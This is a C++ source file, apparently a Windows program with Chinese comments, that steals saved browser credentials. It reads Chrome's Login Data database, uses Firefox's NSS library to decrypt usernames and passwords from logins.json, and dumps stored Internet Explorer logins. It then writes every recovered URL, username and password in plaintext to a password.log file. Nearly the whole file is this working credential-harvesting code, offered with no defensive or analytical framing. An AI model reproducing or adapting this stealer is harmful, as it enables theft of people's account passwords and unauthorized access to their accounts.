// IE浏览器密码获取.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include "pch.h"
#include <iostream>
#include "CIexplorer.h"
#include "tchar.h"
#include <stdio.h>
#include <winver.h>
#include"Firefox_decrypt.h"

#include<regex>
#include <string>
using std::string;
using std::wstring;
#include "Chrome.h"
#include <ShlObj.h>

#pragma  comment(lib, "Version.lib")
void GetModuleFilePath(TCHAR* lpszPath, DWORD dwSize)
{
	::GetModuleFileName(NULL, lpszPath, dwSize);
	int nPathLen = 0;

	for (int i = 0; i != dwSize; i++)
	{
		if (!lpszPath[i])
		{
			break;
		}

		if (lpszPath[i] == ('\\'))
		{
			nPathLen = i;
		}
	}

	lpszPath[nPathLen] = ('\0');
}
wchar_t * ANSIToUnicode(const char* str)
{
	int textlen;
	wchar_t * result;
	textlen = MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, 0);
	result = (wchar_t *)malloc((textlen + 1) * sizeof(wchar_t));
	memset(result, 0, (textlen + 1) * sizeof(wchar_t));
	MultiByteToWideChar(CP_ACP, 0, str, -1, (LPWSTR)result, textlen);
	return result;
}
char * UnicodeToUTF8(const wchar_t* str)
{
	char* result;
	int textlen;
	textlen = WideCharToMultiByte(CP_UTF8, 0, str, -1, NULL, 0, NULL, NULL);
	result = (char *)malloc((textlen + 1) * sizeof(char));
	memset(result, 0, sizeof(char) * (textlen + 1));
	WideCharToMultiByte(CP_UTF8, 0, str, -1, result, textlen, NULL, NULL);
	return result;
}
char*ANSIToUTF8(const char* str)
{
	return UnicodeToUTF8(ANSIToUnicode(str));
}
bool SaveToFile(char * pPathFile, wstring strFile)
{
	FILE *filepath = fopen(pPathFile, "w+");

	if (filepath == NULL)
	{
		return false;
	}
	const wchar_t* strfilew = strFile.c_str();

	string strfileUTF;
	strfileUTF = UnicodeToUTF8(strfilew);

	fwrite(strfileUTF.c_str(), strfileUTF.length(), 1, filepath);

	fclose(filepath);

	return true;
}

wstring string2wstring(string str)
{
	wstring result;
	//获取缓冲区大小，并申请空间，缓冲区大小按字符计算  
	int len = MultiByteToWideChar(CP_ACP, 0, str.c_str(), str.size(), NULL, 0);
	WCHAR* buffer = new WCHAR[len + 1];
	//多字节编码转换成宽字节编码  
	MultiByteToWideChar(CP_ACP, 0, str.c_str(), str.size(), buffer, len);
	buffer[len] = '\0';             //添加字符串结尾  
	//删除缓冲区并返回值  
	result.append(buffer);
	delete[] buffer;
	return result;
}

int main()
{

	TCHAR szSaveFile[MAX_PATH] = { 0 };
	GetModuleFilePath(szSaveFile, MAX_PATH);
	_tcscat_s(szSaveFile, MAX_PATH, "\\password.log");

	//谷歌浏览器密码
	
	string sLoginDataPath;
	wstring buffcherome;//账号密码BUFF
	char szPath[MAX_PATH] = { 0 };
	SHGetSpecialFolderPathA(NULL, szPath, CSIDL_LOCAL_APPDATA, FALSE);
	sLoginDataPath = szPath;
	sLoginDataPath.append("\\Google\\Chrome\\User Data\\Default\\Login Data");

	WIN32_FIND_DATAA FileData = {};
	HANDLE hFindFile = FindFirstFileA(sLoginDataPath.c_str(), &FileData);
	if (hFindFile != INVALID_HANDLE_VALUE)
	{
		FindClose(hFindFile);
		 buffcherome = ReadEncryptData(sLoginDataPath);//获取chrome浏览器密码；
	}
		
	//火狐浏览器密码	
	string installationPath = getInstallationPath();	// 获取Firefox的安装路径（通过注册表）	
	string firefoxbuff;//账号密码BUFF
	HMODULE lib = loadLibrary(installationPath);	// 动态加载nss库(Network Security Services)(网络安全服务)，加载动态链接库文件nss.dll，返回模块句柄
	if (lib == NULL)	// 模块句柄为空，则动态加载失败
	{
		firefoxbuff = "";
	}
	else
	{
		dllFunction(lib);	// 获取nss库中需要用到的方法
		string profilePath = getProfilePath();	// 获取Firefox保存登录信息(用户名，密码)的文件logins.json的路径

		SECStatus s = NSS_Init(profilePath.c_str());	// 初始化NSS库
		if (s != SECSuccess)
		{
			printf("Error when initialization!\n");
		}
		string loginStrings = getBuffer(profilePath);	// 获取logins.json中保存的登录信息
		// 正则表达式匹配
		std::regex reHostname("\"hostname\":\"([^\"]+)\"");
		std::regex reUsername("\"encryptedUsername\":\"([^\"]+)\"");
		std::regex rePassword("\"encryptedPassword\":\"([^\"]+)\"");
		std::smatch match;
		string::const_iterator searchStart(loginStrings.cbegin());	// 循环迭代
		while (std::regex_search(searchStart, loginStrings.cend(), match, reHostname))
		{		
			printf("Host\t: %s \n", U2G(match.str(1).c_str()));
			char*foxurl = U2G(match.str(1).c_str());
			std::regex_search(searchStart, loginStrings.cend(), match, reUsername);

			printf("Username: %s \n", U2G((const char*)decrypt(match.str(1))));	// decrypt用户名并转码输出
			char*foxuseer = U2G((const char*)decrypt(match.str(1)));
			std::regex_search(searchStart, loginStrings.cend(), match, rePassword);
			printf("Password: %s \n", U2G((const char*)decrypt(match.str(1))));	// decrypt密码并转码输出
			char*foxpass = U2G((const char*)decrypt(match.str(1)));
			searchStart += match.position() + match.length();
			printf("-----------------------------------------\n");			
			firefoxbuff += "Url:";
			firefoxbuff += foxurl;
			firefoxbuff += "<?>";
			firefoxbuff += "Username:";
			firefoxbuff += foxuseer;
			firefoxbuff += "<?>";
			firefoxbuff += "Password:";
			firefoxbuff += foxpass;
			firefoxbuff += "<?>";
			firefoxbuff += "\r\n";
		}
		NSS_Shutdown();	// 关闭NSS库
	}
	wstring wfirefoxbuff;
	wfirefoxbuff=string2wstring(firefoxbuff);
	//IE浏览器密码
	CIexplorer iexplorer;
	iexplorer.DumpIExplorer();

	wstring iebuff;//账号密码buff
	while (!iexplorer.pIE.empty())
	{
		get_Iexplorer iePass = iexplorer.pIE.front();
		iexplorer.pIE.pop();
		iebuff += L"Url:";
		iebuff += iePass.url;
		iebuff += L"<?>";
		iebuff += L"Username:";
		iebuff += iePass.user_name;
		iebuff += L"<?>";
		iebuff += L"Password:";
		iebuff += iePass.pass_name;
		iebuff += L"<?>";
		iebuff += L"\r\n";
					
	}

	wstring pData;
	pData += L"chrome浏览器:\r\n";
	pData += buffcherome;
	pData += L"firefox浏览器:\r\n";
	pData += wfirefoxbuff;
	pData += L"ie浏览器:\r\n";
	pData += iebuff;


	SaveToFile(szSaveFile, pData);

	system("PAUSE");
	return 0;

}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门提示: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
